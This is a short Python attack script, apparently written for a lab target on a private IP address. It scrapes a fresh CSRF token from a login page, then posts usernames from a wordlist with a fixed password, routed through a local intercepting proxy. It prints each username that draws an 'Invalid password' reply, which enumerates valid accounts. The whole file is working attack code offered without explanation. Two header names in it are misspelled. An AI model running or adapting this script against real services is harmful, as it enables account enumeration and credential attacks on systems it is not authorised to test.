#simple bypass csrf token script
import requests
from bs4 import BeautifulSoup
import sys

url = 'http://192.168.43.210/login.php'  
header = {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-Withi": "XMLHttpRequest","Cookie": "PHPSESSID=443j9g203gm7d18c4s16am9ni2","Accept": "application/json, text/javascript, */*; q=0.01","Origini": "http://192.168.43.210","Referer": "http://192.168.43.210/login.php","User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}
proxies = {"http":"http://127.0.0.1:8080"}
def getToken():
    response = requests.get(url,headers=header)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'id': 'logcsrf'})
    
    if csrf_token:
        token_value = csrf_token.get('value')
        return token_value
if __name__ == '__main__':
    file = sys.argv[1]
    with open(file,'r') as f:
         for user in f:
             token = getToken()
             data = {"username":user.strip(),"password":"password","logcsrf":token}
             r = requests.post("http://192.168.43.210/RL.php",headers = header,data = data, proxies = proxies)
             if "Invalid password" in r.text:
                 print(user.strip())
                 
